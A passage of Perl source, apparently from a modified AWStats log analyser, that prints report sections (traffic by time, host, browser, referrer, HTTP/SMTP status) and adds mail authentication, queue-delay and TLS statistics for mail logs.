			if ( $AverageBytes > $max_k ) { $max_k = $AverageBytes; }
		}
		else {
			$AverageVisits = "?";
			$AveragePages = "?";
			$AverageHits = "?";
			$AverageBytes = "?";
		}
		# SUMMARY
		#---------------------------------------------------------------------
		if ($ShowSummary) {
			&HTMLMainSummary();
		}
		# 邮件统计 - 仅在 LogType='M' 时显示
		#---------------------------------------------------------------------
		if ( $LogType eq 'M' ) {
			# 邮件认证统计 (DKIM/SPF/DMARC)
			&HTMLShowMailAuthStats();
			
			# 邮件队列延迟统计
			&HTMLShowMailQueueDelay();
			
			# TLS 加密统计
			&HTMLShowMailTLSStats();
			
			# SMTP 错误码统计
			if ($ShowSMTPErrorsStats) {
				&HTMLMainSMTPStatus($NewLinkParams, $NewLinkTarget);
			}
			
			# 邮件流量统计 (发件人/收件人)
			if ($ShowEMailSenders) {
				&HTMLShowEmailSendersChart($NewLinkParams, $NewLinkTarget);
			}
			if ($ShowEMailReceivers) {
				&HTMLShowEmailReceiversChart($NewLinkParams, $NewLinkTarget);
			}
		}
		# BY MONTH
		#---------------------------------------------------------------------
		if ($ShowMonthStats) {
			&HTMLMainMonthly();
		}
		print "\n<a name=\"when\">&nbsp;</a>";
		# BY DAY OF MONTH
		#---------------------------------------------------------------------
		if ($ShowDaysOfMonthStats) {
			&HTMLMainDaily($firstdaytocountaverage, $lastdaytocountaverage,
						  $firstdaytoshowtime, $lastdaytoshowtime);
		}
		# BY DAY OF WEEK
		#-------------------------
		if ($ShowDaysOfWeekStats) {
			&HTMLMainDaysofWeek($firstdaytocountaverage, $lastdaytocountaverage, $NewLinkParams, $NewLinkTarget);
		}
		# BY HOUR
		#----------------------------
		if ($ShowHoursStats) {
			&HTMLMainHours($NewLinkParams, $NewLinkTarget);
		}
		print "\n<a name=\"who\">&nbsp;</a>";
		# BY COUNTRY/DOMAIN
		#---------------------------
		if ($ShowDomainsStats) {
			&HTMLMainCountries($NewLinkParams, $NewLinkTarget);
		}
		# BY HOST/VISITOR
		#--------------------------
		if ($ShowHostsStats) {
			&HTMLMainHosts($NewLinkParams, $NewLinkTarget);
		}
		# BY SENDER EMAIL
		#----------------------------
		if ($ShowEMailSenders) {
			&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );
		}
		# BY RECEIVER EMAIL
		#----------------------------
		if ($ShowEMailReceivers) {
			&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );
		}
		# BY LOGIN
		#----------------------------
		if ($ShowAuthenticatedUsers) {
			&HTMLMainLogins($NewLinkParams, $NewLinkTarget);
		}
		# BY ROBOTS
		#----------------------------
		if ($ShowRobotsStats) {
			&HTMLMainRobots($NewLinkParams, $NewLinkTarget);
		}
		# BY WORMS
		#----------------------------
		if ($ShowWormsStats) {
			&HTMLMainWorms();
		}
		print "\n<a name=\"how\">&nbsp;</a>";
		# BY SESSION
		#----------------------------
		if ($ShowSessionsStats) {
			&HTMLMainSessions();
		}
		# BY FILE TYPE
		#-------------------------
		if ($ShowFileTypesStats) {
			&HTMLMainFileType($NewLinkParams, $NewLinkTarget);
		}
		# BY FILE SIZE
		#-------------------------
		if ($ShowFileSizesStats) {
			&HTMLMainFileSize();
		}
		# BY REQUEST TIME
		#-------------------------
		if ($ShowRequestTimesStats) {
				&HTMLMainRequestTime();
		}
		# BY DOWNLOADS
		#-------------------------
		if ($ShowDownloadsStats) {
			&HTMLMainDownloads($NewLinkParams, $NewLinkTarget);
		}
		# BY PAGE
		#-------------------------
		if ($ShowPagesStats) {
			&HTMLMainPages($NewLinkParams, $NewLinkTarget);
		}
		# BY OS
		#----------------------------
		if ($ShowOSStats) {
			&HTMLMainOS($NewLinkParams, $NewLinkTarget);
			&HTMLMainDeviceTypes($NewLinkParams, $NewLinkTarget);
		}
		# BY BROWSER
		#----------------------------
		if ($ShowBrowsersStats) {
			&HTMLMainBrowsers($NewLinkParams, $NewLinkTarget);
		}
		# BY SCREEN SIZE
		#----------------------------
		if ($ShowScreenSizeStats) {
			&HTMLMainScreenSize();
		}
		print "\n<a name=\"refering\">&nbsp;</a>";
		# BY REFERENCE
		#---------------------------
		if ($ShowOriginStats) {
			&HTMLMainReferrers($NewLinkParams, $NewLinkTarget);
		}
		print "\n<a name=\"keys\">&nbsp;</a>";

		# BY SEARCH KEYWORDS AND/OR KEYPHRASES
		#-------------------------------------
		if ($ShowKeyphrasesStats || $ShowKeywordsStats){
			&HTMLMainKeys($NewLinkParams, $NewLinkTarget);
		}	
		print "\n<a name=\"other\">&nbsp;</a>";
		# BY HTTP PROTOCOL
		#----------------------------
		if ($ShowProtocolStats) {
			&HTMLMainProtocolStats();
		}
		# BY icon STATUS
		#----------------------------
		if ( scalar keys %_icon_status ) {
			&HTMLShowIconStatus($NewLinkParams, $NewLinkTarget);
		}
		# BY HTTP STATUS
		#----------------------------
		if ($ShowHTTPErrorsStats) {
			&HTMLMainHTTPStatus($NewLinkParams, $NewLinkTarget);
		}
		# BY SMTP STATUS
		#----------------------------
		if ($ShowSMTPErrorsStats) {
			&HTMLMainSMTPStatus($NewLinkParams, $NewLinkTarget);
		}
		# BY CLUSTER
		#----------------------------
		if ($ShowClusterStats) {
			&HTMLMainCluster($NewLinkParams, $NewLinkTarget);
		}
		# BY EXTRA SECTIONS
		#----------------------------
		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			&HTMLMainExtra($NewLinkParams, $NewLinkTarget, $extranum);
		}
		# close the HTML page
		&html_end(1);
	}
	}
	else {
		print "Jumped lines in file: $lastlinenb\n";
		if ($lastlinenb) { print " Found $lastlinenb already parsed records.\n"; }
		print "Parsed lines in file: $NbOfLinesParsed\n";
		print " Found $NbOfLinesDropped dropped records,\n";
		print " Found $NbOfLinesComment comments,\n";
		print " Found $NbOfLinesBlank blank records,\n";
		print " Found $NbOfLinesCorrupted corrupted records,\n";
		print " Found $NbOfOldLines old records,\n";
		print " Found $NbOfNewLines new qualified records.\n";
	}
}
#endregion MAIN
0;